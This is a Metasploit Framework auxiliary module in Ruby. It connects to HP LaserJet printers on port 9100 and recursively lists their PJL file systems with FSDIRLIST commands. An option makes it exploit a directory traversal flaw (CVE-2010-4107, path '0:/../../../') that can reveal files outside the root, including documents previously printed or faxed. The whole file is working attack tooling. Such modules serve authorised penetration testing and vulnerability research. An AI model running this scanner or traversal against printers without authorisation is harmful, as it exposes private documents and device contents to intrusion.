##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Tcp
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner

	def initialize(info={})
		super(update_info(info,
			'Name'           => 'HP LaserJet Printer File System Enumeration',
			'Description'    => %q{
				This module allows to enumerate the file system of HP LaserJet printers.
				In some cases it's even possible to enumerate the files previously printed or faxed.
				Moreover a directory traversal vulnerability could be used to enum the file system
				of various HP LaserJet MFP devices.
			},
			'References'     =>
				[
					['CVE', '2010-4107'],
					['EDB', '15631'],
					['URL', 'http://h20000.www2.hp.com/bc/docs/support/SupportManual/bpl13208/bpl13208.pdf'],
					['URL', 'http://packetstormsecurity.org/files/103778/hpjetdirect-exec.rb.txt'],
				],
			'Author'         => 'Matteo Cantoni <goony[at]nothink.org>',
			'License'        => MSF_LICENSE
		))

		register_options(
			[
				Opt::RPORT(9100),
				OptBool.new('TRAVERSAL', [false, 'Try enumeration only with the directory traversal vulnerability', false]),
				OptInt.new('VOLUME', [true, 'The volume of the PJL file system', 0]),
				OptInt.new('ENTRY', [true, 'Used to limit the amount of data returned to the host', 1]),
				OptInt.new('COUNT', [true, 'Used to limit the amount of data returned to the host', 999999]),
				OptInt.new('TIMEOUT', [true, 'Long timeout for the printer enumeration', 300])
			], self.class)

		deregister_options('VHOST')
	end

	# PJL commands are recognized by the following HP printers:
	#
	# . LaserJet IIISi, 4Si, 4SiMx, 5Si, 5SiMx, 5Si Mopier
	# . LaserJet 1100 Series, 2100 Series
	# . LaserJet 4000 Series, 5000 Series
	# . LaserJet 8000 Series, 8100 Series
	# . LaserJet 4V, 4MV
	# . LaserJet 4, 4 Plus, 4M, 4M Plus, 5, 5M
	# . LaserJet 4L, 4ML, 4LJ Pro, 4LC, 5L, 6L
	# . LaserJet 4P, 4MP, 4PJ, 5P, 6P, 6MP
	# . Color LaserJet, Color LaserJet 5, 5M
	# . Color LaserJet 4500 Series, 8500 Series
	# . DeskJet 1200C, 1600C
	# . DesignJet Family
	# . PaintJet XL300

	def errors_handling(err_code)

		err_code = err_code.to_i + 32000

		# PJL File System Errors (32xxx)
		fs_errors = {
			'32000' => 'General error',
			'32001' => 'Volume not available',
			'32002' => 'Disk full',
			'32003' => 'File not found',
			'32004' => 'No free file descriptors',
			'32005' => 'Invalid number of bytes',
			'32006' => 'File already exists',
			'32007' => 'Illegal name',
			'32008' => 'Can\'t delete root',
			'32009' => 'File operation attempted on a directory',
			'32010' => 'Directory operation attempted on a file',
			'32011' => 'Not same volume',
			'32012' => 'Read only',
			'32013' => 'Directory full',
			'32014' => 'Directory not empty',
			'32015' => 'Bad disk',
			'32016' => 'No label',
			'32017' => 'Invalid parameter',
			'32018' => 'No contiguous space',
			'32019' => 'Can\'t change root',
			'32020' => 'File Descriptor obsolete',
			'32021' => 'Deleted',
			'32022' => 'No block device',
			'32023' => 'Bad seek',
			'32024' => 'Internal error',
			'32025' => 'Write only',
			'32026' => 'Write protected',
			'32027' => 'No filename',
			'32051' => 'End of directory',
			'32052' => 'No file system',
			'32053' => 'No memory',
			'32054' => 'Vol name out of range',
			'32055' => 'Bad FS',
			'32056' => 'Hardware failure'
		}

		if (fs_errors.has_key?(err_code.to_s))
			return fs_errors[err_code.to_s]
		else
			return 'Bad command or error'
		end
	end

	def to
		return 300 if datastore['TIMEOUT'].to_i.zero?
		datastore['TIMEOUT'].to_i
	end

	def send_request(ip,port,conn,fs_data_res,fs_path)

		entry = datastore['ENTRY']
		count = datastore['COUNT']

		# Format of PJL Commands - #4
		#
		# @PJL command [command modifier : value] [option name [= value]] [<CR>]<LF>
		# This format is used for all of the other PJL commands.
		# The PJL prefix .@PJL. always must be uppercase.
		prefix = "@PJL "
		postfix = "\r\n"

		command = 'FSDIRLIST NAME="' + fs_path + '"' + " ENTRY=#{entry} COUNT=#{count}"

		req = prefix + command + postfix

		vprint_status("Sending request: #{req.chop}")

		conn.put(req)
		res = conn.get(-1,1)

		# Temporary array to collect directory paths
		fs_data_res_tmp = []

		if not res
			raise RuntimeError, "Error in receiving data from #{ip}:#{port}"
		elsif res and res.to_s =~ /ERROR/
			if res.to_s =~ /FILEERROR=(\d+)/
				file_error = errors_handling($1)
				print_error("'#{file_error}' message from #{ip}:#{port}!")
				return
			end
		end

		print_status("Enumerating #{ip}:#{port}...")

		resx = res.to_s[res.index(postfix)+1,res.length]

		if (req =~ /^@PJL FSDIRLIST NAME="(.*)" ENTRY=/)
			dir_path = $1

			resx.split("\n").each do |line|
				if line !~ /^\. |^\.\. /
					if line =~ /(.*) TYPE=FILE SIZE=(\d+)/
						file_name = $1
						file_size = $2
						fs_data_res << "#{fs_path}\\#{file_name} (#{file_size} bytes)"
					elsif line =~ /(.*) TYPE=DIR/
						dir_path,type_path = line.chop.split(" ")
						fs_data_res << "#{fs_path}\\#{dir_path} DIR"
						fs_data_res_tmp << "#{fs_path}\\#{dir_path}"
					end
				end
			end
		end

		# Recursive loop for directories
		fs_data_res_tmp.each do |fs_path|
			send_request(ip,port,conn,fs_data_res,fs_path)
		end
	end

	def connect_to(ip)

		port = datastore['RPORT']
		volume = datastore['VOLUME']

		print_status("Connecting to #{ip}:#{port}...")

		begin
			::Timeout.timeout(to) do
				conn = connect

				# Array to collect file system paths
				fs_data_res = []

				# 0: Volume 0
				# 0:\ Root directory on volume 0
				traversal = datastore['TRAVERSAL']

				if traversal
					send_request(ip,port,conn,fs_data_res,"#{volume}:/../../../")
					print_good("enable traversal: #{volume}:/../../../")
				else
					send_request(ip,port,conn,fs_data_res,"#{volume}:\\")
					print_good("not traversal: #{volume}:\\")
				end

				print_good("File system information:")

				fs_data_res.sort.each do |fs_path|
					print_status("#{ip}:#{fs_path}")

					report_note(
						:host => rhost,
						:type => 'hp_laserjet_enum_fs',
						:data => fs_path
					)
				end
			end

		rescue ::Rex::ConnectionError
		rescue Timeout::Error
			print_error("#{rhost}:#{rport}, printer timed out after #{to} seconds.")
		rescue ::Errno::ECONNRESET
			print_error("#{rhost}:#{rport}, connection reset by peer.")
		rescue ::Exception => e
			print_error("#{rhost}:#{rport}, #{e} #{e.backtrace}")
		ensure
			disconnect
		end
	end

	def run_host(ip)
		connect_to(ip)
	end
end
